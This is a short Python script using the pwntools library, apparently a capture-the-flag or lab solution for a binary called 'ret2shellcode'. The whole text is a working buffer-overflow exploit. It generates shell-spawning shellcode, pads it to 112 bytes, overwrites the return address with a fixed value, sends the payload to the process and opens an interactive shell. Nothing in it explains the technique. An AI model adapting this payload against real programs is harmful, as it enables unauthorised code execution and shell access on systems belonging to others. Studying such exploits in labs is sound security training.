from pwn import *

returnAddress = 0x0804A080

io = process('./ret2shellcode')

shellcode = asm(shellcraft.sh())

shellcode = shellcode.ljust(112,b'A')

payload = shellcode + p32(returnAddress)

io.sendline(payload)

io.interactive()
